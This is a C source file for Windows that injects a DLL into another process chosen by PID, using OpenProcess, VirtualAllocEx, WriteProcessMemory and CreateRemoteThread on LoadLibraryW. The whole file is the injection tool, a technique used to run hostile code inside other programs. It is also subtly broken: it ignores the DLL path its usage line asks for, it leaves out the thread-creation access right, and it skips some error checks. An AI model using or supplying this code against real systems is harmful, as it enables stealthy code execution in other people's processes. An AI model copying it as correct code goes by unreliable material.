#include <windows.h>
#include <stdio.h>



int main (int argc, char* argv[]){


    

    if (argc < 2){
        printf("[!]USAGE: %s  <pid> <Path to dll>\n",argv[0]);
        return 1;
    }

    wchar_t DllPath[] = L"C:\\path\\to\\dll.dll";
    size_t size = (DWORD) sizeof(DllPath);

    printf("[*]Trying to inject to process with pid %d\n",atoi(argv[1]) );

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_VM_OPERATION ,
     FALSE,
     (DWORD) atoi(argv[1])  );

    if (!hProcess){
        printf("[!]Failed to get a handle to the specified Process \n Error : %ld\n",GetLastError() );
        return 1;
    }

    printf("[*]Got a handle of the process in 0x%p \n",hProcess);

    LPVOID rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        size,
        MEM_COMMIT|MEM_RESERVE,
        PAGE_READWRITE
    );


    HMODULE hKernel32 = GetModuleHandleW( L"kernel32" );

    if (!hKernel32) {
		printf("[!]Failed to get a handle to Kernel32.dll, error: 0x%ld", GetLastError());
		return 1;
	}

    printf("[!]Got a handle in kernel32.dll module in 0x%p \n",hKernel32);


    LPTHREAD_START_ROUTINE func_addr = (LPTHREAD_START_ROUTINE)GetProcAddress(
        hKernel32,
        "LoadLibraryW"
    );


    WriteProcessMemory(
        hProcess,
        rBuffer,
        DllPath,
        size,
        NULL
    );

    DWORD tid = 0;
    
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0 ,
        func_addr ,
        rBuffer ,
        0 ,
        &tid
    );
    printf("%ld",tid);
    WaitForSingleObject(hThread, INFINITE);

    if (hThread) {
		CloseHandle(hThread);
	}

    if (hProcess){
        CloseHandle(hProcess);
    }

    return 0;
}